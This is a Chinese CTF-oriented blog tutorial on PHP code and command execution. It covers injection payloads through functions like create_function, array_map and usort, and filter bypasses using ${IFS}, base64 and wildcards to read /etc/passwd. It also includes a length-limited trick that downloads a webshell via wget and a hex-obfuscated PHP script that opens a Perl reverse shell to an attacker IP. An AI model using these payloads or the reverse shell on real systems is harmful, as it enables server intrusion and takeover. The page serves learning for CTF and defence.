<!DOCTYPE html>
<html>

<head>
  
  <title>命令执行 - Sla，当你走了，我发誓不会堕落</title>
  <meta charset="UTF-8">
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  

  <link rel="shortcut icon" href="/images/avatar.png" type="image/png" />
  <meta name="description" content="关于命令执行的一些简单知识和简单绕过">
<meta property="og:type" content="article">
<meta property="og:title" content="命令执行">
<meta property="og:url" content="http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;cf64b99a.html">
<meta property="og:site_name" content="Sla，当你走了，我发誓不会堕落">
<meta property="og:description" content="关于命令执行的一些简单知识和简单绕过">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;cmd&#x2F;1.png">
<meta property="article:published_time" content="2019-12-28T04:15:59.488Z">
<meta property="article:modified_time" content="2020-01-06T16:45:45.876Z">
<meta property="article:author" content="Stao">
<meta property="article:tag" content="命令执行">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;cmd&#x2F;1.png">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
   
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
  <link rel="stylesheet" href="/css/style.css?v=1578330154653">
<meta name="generator" content="Hexo 4.1.1"></head>

<body class="mdui-drawer-body-left">
  
  <div id="nexmoe-background">
    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
    <div class="mdui-appbar mdui-shadow-0">
      <div class="mdui-toolbar">
        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
        <div class="mdui-toolbar-spacer"></div>
        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
        <a href="/" title="Stao" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
       </div>
    </div>
  </div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Stao">
            <img src="/images/avatar.png" alt="Stao">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>7</div>
        <div><span>标签</span>8</div>
        <div><span>分类</span>2</div>
    </div>
    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </ul>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">社交按钮</h3>
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://github.com/ctfer-Stao" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/web/">web</a>
          <span class="category-list-count">4</span>
        </li>

        
      </ul>

    </div>
  </div>


  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">标签云</h3>
    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
      <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/readflag/" style="font-size: 10px;">readflag</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/xxe/" style="font-size: 13.33px;">xxe</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.67px;">命令执行</a>
    </div>
    
  </div>

  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2020 Stao
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-post">
    <div class="nexmoe-post-cover"> 
        
        <img src="http://img5.imgtn.bdimg.com/it/u=2946895271,738112806&fm=26&gp=0.jpg">
        
        <h1>命令执行</h1>
    </div>
  <div class="nexmoe-post-meta">
    <a><i class="nexmoefont icon-calendar-fill"></i>2019年12月28日</a>
    <a><i class="nexmoefont icon-areachart"></i>3.8k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 18 分钟</a>
    
      <a class="nexmoefont icon-appstore-fill -link" href="/categories/web/">web</a>
    
    
      <a class="nexmoefont icon-tag-fill -link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
    
  </div>
  <article>
    <p>关于命令执行的一些简单知识和简单绕过</p>
<a id="more"></a>
<h1 id="命令执行和绕过技巧"><a href="#命令执行和绕过技巧" class="headerlink" title="命令执行和绕过技巧"></a>命令执行和绕过技巧</h1><h2 id="首先看一下php中代码执行的几种方式"><a href="#首先看一下php中代码执行的几种方式" class="headerlink" title="首先看一下php中代码执行的几种方式"></a>首先看一下php中代码执行的几种方式</h2><h3 id="1-eval"><a href="#1-eval" class="headerlink" title="1.eval()"></a>1.eval()</h3><p>eval()函数应该是php中最常见的代码执行函数，它会将字符串当作php代码执行，记得字符串要规范，不要漏掉分号。如 </p>
<p><code>eval(&quot;phpinfo();&quot;),eval(phpinfo())</code></p>
<h3 id="2"><a href="#2" class="headerlink" title="2.${}"></a>2.${}</h3><p>${}见的比较少，直接${php代码}，不加分号，如</p>
<pre><code>${phpinfo()},${eval($a)}</code></pre><h3 id="3-assert"><a href="#3-assert" class="headerlink" title="3.assert()"></a>3.assert()</h3><p>assert()可以将传入的字符串当作php代码执行，而且可以不加分号。如assert($_GET[‘cmd’]),assert(phpinfo())。但是在php版本7后，用assert执行php代码没有成功。</p>
<p><code>$a=&#39;assert&#39;;$a(phpinfo());</code></p>
<h3 id="4-preg-replace"><a href="#4-preg-replace" class="headerlink" title="4.preg_replace()"></a>4.preg_replace()</h3><p>preg_replace($pattern, $replacement, $subject);<br>函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。<br>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。php5.5.0之前，该函数存在远程代码执行漏洞，/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
<pre><code>$a = &apos;phpinfo()&apos;;
preg_replace(&quot;/abc/e&quot;,$a,&apos;abcd&apos;);</code></pre><h3 id="5-create-function"><a href="#5-create-function" class="headerlink" title="5.create_function()"></a>5.create_function()</h3><p>该函数用来创建匿名函数。<br>这个函数的实现大概是这样的</p>
<pre><code>$b = create_function(&apos;$name&apos;,&apos;echo $name;&apos;);
//实现
function niming($name){
echo $name;
}

$b(yang);

niming(&apos;yang&apos;);</code></pre><p>第二个参数是执行代码的地方，将payload放在第二个参数的位置，然后调用该函数就可以执行payload了。<br>执行代码</p>
<pre><code>$a = &apos;phpinfo();&apos;;
$b = create_function(&quot; &quot;,$a);
$b();</code></pre><p>上面这种方法是最直接的，接下来看一点有趣的。<br>    $id=$_GET[‘id’];</p>
<pre><code>$code = &apos;echo $name. &apos;.&apos;的编号是&apos;.$id.&apos;; &apos;;

$b = create_function(&apos;$name&apos;,$code);
//实现
function niming($name){
echo $name.&quot;编号&quot;.$id;
}
$b(&apos;sd&apos;);</code></pre><p>这里直接传入phpinfo是不行的，构造的payload</p>
<pre><code>?id=2;}phpinfo();/* </code></pre><p>传入后，代码如下</p>
<pre><code>function niming($name){
echo $name.编号2;
 }phpinfo();/*
}</code></pre><p>这样就执行了代码</p>
<h3 id="6-array-map"><a href="#6-array-map" class="headerlink" title="6.array_map()"></a>6.array_map()</h3><p>array array_map ( callable $callback , array $array1 [, array $… ] )<br>array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。函数例子</p>
<pre><code>&lt;?php
function cube($n)
{
return($n * $n * $n);
}

$a = array(1, 2, 3, 4, 5);
$b = array_map(&quot;cube&quot;, $a);
print_r($b);
?&gt;</code></pre><p>这使得 $b 成为：</p>
<pre><code>Array
(
[0] =&gt; 1
[1] =&gt; 8
[2] =&gt; 27
[3] =&gt; 64
[4] =&gt; 125
)</code></pre><p>漏洞演示</p>
<pre><code>$a = $_GET[&apos;a&apos;];
$b = $_GET[&apos;b&apos;];
$array[0] = $b;
$c = array_map($a,$array);</code></pre><p>构造a=assert&amp;b=phpinfo(); (php7.0之前)或者a=system&amp;b=ls<br>但是不能a=eval&amp;b=phpinfo(); eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然她确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，…</p>
<h3 id="7-call-user-func"><a href="#7-call-user-func" class="headerlink" title="7.call_user_func()"></a>7.call_user_func()</h3><p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。示例</p>
<pre><code>call_user_func($_GET[&apos;b&apos;],$_GET[&apos;a&apos;]);</code></pre><p>构造poc跟array_map()一样</p>
<h3 id="8-call-user-func-array"><a href="#8-call-user-func-array" class="headerlink" title="8.call_user_func_array()"></a>8.call_user_func_array()</h3><p>mixed call_user_func_array ( callable $callback , array $param_arr )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。示例</p>
<pre><code>$array[0] = $_GET[&apos;a&apos;];

call_user_func_array($_GET[&apos;b&apos;],$array); </code></pre><p>  构造poc跟array_map()一样  </p>
<h3 id="9-array-filter"><a href="#9-array-filter" class="headerlink" title="9.array_filter()"></a>9.array_filter()</h3><p>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
<p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。<br>示例</p>
<pre><code>$array[0] = $_GET[&apos;a&apos;];
array_filter($array,&apos;system&apos;);</code></pre><h3 id="10-usort-uasort"><a href="#10-usort-uasort" class="headerlink" title="10.usort()/uasort()"></a>10.usort()/uasort()</h3><p>bool usort ( array &amp;$array , callable $value_compare_func )<br>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。<br>示例</p>
<pre><code>&lt;?php
// ?1[]=ls&amp;1[]=ls&amp;2=system
usort(...$_GET);
?&gt;</code></pre><p>payload只有5.6以上版本能用，关于…$_GET是php5.6引入的新特性。即将数组展开成参数的形式。大概过程就是，GET变量被展开成两个参数[‘ls’, ‘ls’]和system，传入usort函数。usort函数的第二个参数是一个回调函数system，其调用了第一个参数中的ls。<br>利用这个函数可以在字符长度限制的时候实现巧妙绕过</p>
<pre><code>&lt;?php
$param = $_REQUEST[&apos;param&apos;];
if(strlen($param)&lt;17 &amp;&amp; stripos($param,&apos;eval&apos;) === false &amp;&amp; stripos($param,&apos;assert&apos;) === false) {
  eval($param);
}
?&gt;</code></pre><p>构造<a href="http://10.10.10.135/123.php?param=usort(...$_POST)" target="_blank" rel="noopener">http://10.10.10.135/123.php?param=usort(...$_POST)</a>;<br>然后post 1[]=test&amp;1[]=whoami&amp;2=system<br>或者<a href="http://10.10.10.135/123.php?1[]=test&amp;1[]=whoami&amp;2=system" target="_blank" rel="noopener">http://10.10.10.135/123.php?1[]=test&amp;1[]=whoami&amp;2=system</a><br>然后 post usort(…$_GET);</p>
<h2 id="再来看一下php中执行命令的函数"><a href="#再来看一下php中执行命令的函数" class="headerlink" title="再来看一下php中执行命令的函数"></a>再来看一下php中执行命令的函数</h2><h3 id="1-exec"><a href="#1-exec" class="headerlink" title="1.exec()"></a>1.exec()</h3><p>exec()函数没有输出结果，返回命令执行结果的最后一行内容。 因为没有输出执行结果，所以可以用时间盲注，dnslog等方法。<br>示例：eval(exec($c)); 可以构造payload：c=echo “print_r(scandir(<strong>DIR</strong>));” 原理是：因为exec()会返回命令执行结果的最后一行，而这个返回结果print_r(scandir(<strong>DIR</strong>)); 刚好被eval执行。 也可以用基于时间的盲注[ <code>cut -c 1 flag.txt</code> == “8” ] &amp;&amp;sleep 3</p>
<h3 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec()"></a>2.shell_exec()</h3><p>跟exec()差不多，也是没有输出结果，返回命令执行的结果。</p>
<h3 id="3-system"><a href="#3-system" class="headerlink" title="3.system()"></a>3.system()</h3><p>直接输出结果，返回命令执行的输出的最好一行</p>
<h3 id="4-passthru"><a href="#4-passthru" class="headerlink" title="4.passthru()"></a>4.passthru()</h3><p>直接输出结果，无返回值</p>
<h3 id="5-反引号"><a href="#5-反引号" class="headerlink" title="5.`反引号"></a>5.`反引号</h3><pre><code>echo `代码`</code></pre><h3 id="6-ob-start"><a href="#6-ob-start" class="headerlink" title="6.ob_start()"></a>6.ob_start()</h3><pre><code>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</code></pre><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p>
<p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p>
<p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。</p>
<pre><code>&lt;?php
    $cmd = &apos;system&apos;;
    ob_start($cmd);
    echo &quot;$_GET[a]&quot;;
    ob_end_flush();
?&gt;</code></pre><h3 id="7-mail函数-LD-PRELOAD执行系统命令"><a href="#7-mail函数-LD-PRELOAD执行系统命令" class="headerlink" title="7.mail函数+LD_PRELOAD执行系统命令"></a>7.mail函数+LD_PRELOAD执行系统命令</h3><p>这个比较复杂，下次专门写篇博客学习。</p>
<h3 id="8-popen-函数"><a href="#8-popen-函数" class="headerlink" title="8.popen()函数"></a>8.popen()函数</h3><pre><code>resource popen ( string $command , string $mode )</code></pre><p>函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。</p>
<p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。</p>
<p>popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。</p>
<p>返回一个和fopen()所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用pclose()来关闭。</p>
<p>此指针可以用于fgets()，fgetss()和 fwrite()</p>
<pre><code>&lt;?php popen( &apos;whoami &gt;&gt; c:/1.txt&apos;, &apos;r&apos; ); ?&gt;
&lt;?php  
$test = &quot;ls /tmp/test&quot;;  
$fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  

while (!feof($fp)) {      //从通道里面取得东西  
     $out = fgets($fp, 4096);  
     echo  $out;         //打印出来  
}  
pclose($fp);  
?&gt; </code></pre><h3 id="9-proc-open"><a href="#9-proc-open" class="headerlink" title="9.proc_open()"></a>9.proc_open()</h3><pre><code>resource proc_open ( 
string $cmd , 
array $descriptorspec , 
array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] 
)</code></pre><p>与Popen函数类似，但是可以提供双向管道</p>
<pre><code>&lt;?php  
$test = &quot;ipconfig&quot;;  
$array =   array(  
 array(&quot;pipe&quot;,&quot;r&quot;),   //标准输入  
 array(&quot;pipe&quot;,&quot;w&quot;),   //标准输出内容  
 array(&quot;pipe&quot;,&quot;w&quot;)    //标准输出错误  
 );  

$fp = proc_open($test,$array,$pipes);   //打开一个进程通道  
echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容  
proc_close($fp);  
?&gt;</code></pre><h3 id="10-pcntl-exec-函数"><a href="#10-pcntl-exec-函数" class="headerlink" title="10.pcntl_exec()函数"></a>10.pcntl_exec()函数</h3><pre><code>void pcntl_exec ( string $path [, array $args [, array $envs ]] )</code></pre><p>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。</p>
<p>pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。</p>
<p>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0</p>
<pre><code>&lt;?php

pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;tmp/1&quot;));

?&gt;</code></pre><p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/cmd/1.png" alt=""></p>
<p>看到网上有的payload是 pcntl_exec ( “/bin/bash” , array(“whoami”)); 但是我在kali没有测试成功，提示/usr/bin/whoami: /usr/bin/whoami：无法执行二进制文件。而且写在php脚本，然后用网页访问执行php文件，提示不存在pcntl_exec函数，直接在命令行php -r 就可以。</p>
<p>这里给出可以反弹shell的脚本</p>
<pre><code>&lt;?php 
/*******************************
 *查看phpinfo编译参数--enable-pcntl
 *作者 Spider
 *nc -vvlp 443
********************************/

$ip = &apos;xxx.xxx.xxx.xxx&apos;;
$port = &apos;443&apos;;
$file = &apos;/tmp/bc.pl&apos;;

header(&quot;content-Type: text/html; charset=gb2312&quot;);

if(function_exists(&apos;pcntl_exec&apos;)) {
        $data = &quot;\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a&quot;.
                &quot;\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20&quot;.
                &quot;\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65&quot;.
                &quot;\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27&quot;.$ip.
                &quot;\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27&quot;.$port.
                &quot;\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72&quot;.
                &quot;\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24&quot;.
                &quot;\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e&quot;.
                &quot;\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f&quot;.
                &quot;\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68&quot;.
                &quot;\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f&quot;.
                &quot;\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43&quot;.
                &quot;\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44&quot;.
                &quot;\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43&quot;.
                &quot;\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65&quot;.
                &quot;\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20&quot;.
                &quot;\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21&quot;.
                &quot;\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b&quot;.
                &quot;\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43&quot;.
                &quot;\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f&quot;.
                &quot;\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a&quot;.
                &quot;\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a&quot;;
        $fp = fopen($file,&apos;w&apos;);
        $key = fputs($fp,$data);
        fclose($fp);
        if(!$key) exit(&apos;写入&apos;.$file.&apos;失败&apos;);
        chmod($file,0777);
        pcntl_exec($file);
        unlink($file);
} else {
        echo &apos;不支持pcntl扩展&apos;;
}
?&gt;</code></pre><h2 id="绕过方式-linux"><a href="#绕过方式-linux" class="headerlink" title="绕过方式(linux)"></a>绕过方式(linux)</h2><h3 id="1-绕过空格过滤"><a href="#1-绕过空格过滤" class="headerlink" title="1.绕过空格过滤"></a>1.绕过空格过滤</h3><p>&lt;<br>${IFS}<br>$IFS$9<br>%09</p>
<pre><code>root@kali:~# cat&lt;test.txt
hello world!
root@kali:~# cat${IFS}test.txt
hello world!
root@kali:~# cat$IFS$9test.txt
hello world!
root@kali:~#
//http://ip/index.php?cmd=cat%091.txt</code></pre><p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串! 还有就是，当传入参数是system(“ls${IFS}/“)时，没办法执行成功，但是直接传入ls${IFS}/，即php代码为eval(system($_GET[‘cmd’]));时，可以成功。</p>
<h3 id="2-绕过分隔符过滤"><a href="#2-绕过分隔符过滤" class="headerlink" title="2.绕过分隔符过滤"></a>2.绕过分隔符过滤</h3><p>正常linux的管道符有 $ | ; $$和||<br>$:是将命令放到后台执行<br>;：是连续执行多条命令<br>|:管道符左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示<br>$$:只有左边的命令都为真，后面的命令才会执行<br>||:只有左边的命令都为假，后面的命令才会执行</p>
<p>当管道符被过滤的时候，可以用%0a 符号，相当于管道符’;’。</p>
<h3 id="3-字符拼接绕过敏感字符过滤"><a href="#3-字符拼接绕过敏感字符过滤" class="headerlink" title="3.字符拼接绕过敏感字符过滤"></a>3.字符拼接绕过敏感字符过滤</h3><p>比如过滤了ls.<br>payload:</p>
<pre><code>http://10.10.10.143/123.php?cmd=a=l;b=s;$a$b</code></pre><h3 id="4-base64编码绕过"><a href="#4-base64编码绕过" class="headerlink" title="4.base64编码绕过"></a>4.base64编码绕过</h3><pre><code>payload: system(&quot;`echo &apos;bHMK&apos;|base64 -d`&quot;)</code></pre><p>其中的base64编码为ls的编码，base64 -d的用来解码的</p>
<h2 id="七个字的命令执行-基于一道CTF题"><a href="#七个字的命令执行-基于一道CTF题" class="headerlink" title="七个字的命令执行(基于一道CTF题)"></a>七个字的命令执行(基于一道CTF题)</h2><p>题目：</p>
<pre><code>&lt;?php
if(strlen($_GET[1])&lt;8){
 echo shell_exec($_GET[1]);
}
?&gt;</code></pre><p>这道题限制了命令的字符数，直接写shell是不可能的，因为 echo 1&gt;1要八个字符，下载一个shell也不行，因为wget a.cn也要八个字符。</p>
<p>这里要用到1&gt;filename，这个命令可以创造一个空的文件。(a&gt;filename也可以，虽然会报错)。ls &gt;filename 可以将结果放到文件，但是默认会加\n，ls -t是按时间顺利列出文件,最先修改的在最前面。<br>这样的sh文件是能够被执行的。其中a.cn为自己的域名,1.php就是放在自己服务器上的shell文件。</p>
<pre><code>wget\
 a.\
cn\
-O\
1.php</code></pre><p>写的时候注意下空格，还有就是linux 需要用\对空格和\进行转义。</p>
<h2 id="绕过-的ip过滤"><a href="#绕过-的ip过滤" class="headerlink" title="绕过.的ip过滤"></a>绕过.的ip过滤</h2><p>可以将IP地址转换为数字地址绕过。<br>如<br><a href="http://www.msxindl.com/tools/ip/ip_num.asp" target="_blank" rel="noopener">http://www.msxindl.com/tools/ip/ip_num.asp</a></p>
<h2 id="通配符绕waf"><a href="#通配符绕waf" class="headerlink" title="通配符绕waf"></a>通配符绕waf</h2><h3 id="关于通配符"><a href="#关于通配符" class="headerlink" title="关于通配符"></a>关于通配符</h3><p>Bash标准通配符（也称为通配符模式）被各种命令行程序用于处理多个文件。有关标准通配符的更多信息，请通过键入man 7 glob命令查看手册了解。并不是每个人都知道有很多bash语法是可以使用问号“？”，正斜杠“/”，数字和字母来执行系统命令的。你甚至可以使用相同数量的字符获取文件内容。<br>如/???/ls 列出文件，实际就是执行/bin/ls<br>如/???/?at /???/p????d 获取etc/passwd，实际就是执行/bin/cat /etc/passwd</p>
<p>具体的还是要根据实际情况，然后在命令行自己测试，写出payload.<br>两篇比较老的参考文章，里面很多大多数不能用了。<br><a href="https://www.freebuf.com/articles/web/160175.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/160175.html</a><br><a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></p>

  </article>
  
    
<div class="nexmoe-post-copyright">
<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
<strong>本文作者：</strong>Stao<br>
<strong>本文链接：</strong><a href="http://stao.site/posts/cf64b99a.html" title="http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;cf64b99a.html" target="_blank" rel="noopener">http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;cf64b99a.html</a><br>

  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

</div>


  
  <section class="nexmoe-comment">
    <div class="valine"></div>
<script src='https://cdn.jsdelivr.net/npm/valine@1.3.9/dist/Valine.min.js'></script>
<script>
    // 使用方法 https://valine.js.org/quickstart.html
    new Valine({
        el: '.valine',
        appId: 'U6bjcH3nqE46nXLkozomi6Fq-gzGzoHsz',
        appKey: 'gXsdLMIoOKAg7tcJ8a76J02l'
    })
</script>
</section>
</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
 
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>


 
    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>


<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/js/app.js?v=1578330154658"></script>
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>


